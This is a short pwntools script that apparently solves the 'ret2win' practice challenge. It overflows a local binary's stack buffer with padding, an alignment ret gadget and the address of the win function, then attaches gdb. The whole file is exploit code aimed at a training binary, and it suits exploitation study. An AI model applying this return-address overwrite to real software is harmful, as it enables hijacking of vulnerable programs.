#!/usr/bin/env python3
from pwn import *

# 0x004005e1 : (b'c3')    ret
# 0x00400619 : (b'c3')    ret
# 0x00400659 : (b'c3')    ret
# 0x0040067a : (b'c3')    ret
# 0x00400681 : (b'c3')    ret
# 0x004006e7 : (b'c3')    ret
# 0x00400755 : (b'c3')    ret
# 0x00400770 : (b'c3')    ret
# 0x004007cf : (b'c3')    ret
# 0x004007e4 : (b'c3')    ret
# 0x004007f1 : (b'c3')    ret
# 0x004007fc : (b'c3')    ret

p = process("./ret2win")
context.update(arch="amd64",os="linux")

rsp_offset = 0x20
ret = 0x0040053e # 0x004005e1 : (b'c3')    ret
ret2win = 0x0000000000400756

payload = b"\x90" * rsp_offset
payload += b"\x90\x90\x90\x90" * 2
payload += p64(ret)
payload += p64(ret2win)

gdb.attach(p)

p.send(payload)
p.recvall()
